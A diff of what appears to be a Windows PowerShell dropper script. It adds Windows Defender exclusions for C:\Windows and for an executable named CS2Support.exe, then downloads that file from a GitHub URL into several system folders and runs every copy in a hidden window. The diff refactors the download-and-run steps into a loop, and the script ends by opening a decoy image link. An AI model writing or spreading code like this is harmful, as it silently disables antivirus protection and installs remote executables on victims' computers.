@@ -8,14 +8,20 @@ powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Win
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Windows\SysWOW64\CS2Support.exe'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"
 
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Users\Public\Downloads'"
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Windows\System32'"
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Windows\SysWOW64'"
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile 'C:\Windows'"
+# Define the download URL and target locations
+$url = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe'
+$locations = @(
+    'C:\Users\Public\Downloads\CS2Support.exe',
+    'C:\Windows\System32\CS2Support.exe',
+    'C:\Windows\SysWOW64\CS2Support.exe',
+    'C:\Windows\CS2Support.exe'
+)
 
-Start-Process "C:\Users\Public\Downloads\CS2Support.exe" -WindowStyle Hidden
-Start-Process "C:\Windows\System32\CS2Support.exe" -WindowStyle Hidden
-Start-Process "C:\Windows\SysWOW64\CS2Support.exe" -WindowStyle Hidden
-Start-Process "C:\Windows\CS2Support.exe" -WindowStyle Hidden
+# Download and execute the file at each location
+foreach ($location in $locations) {
+    Invoke-WebRequest -Uri $url -OutFile $location
+    Start-Process $location -WindowStyle Hidden
+}
+
 
 start https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg
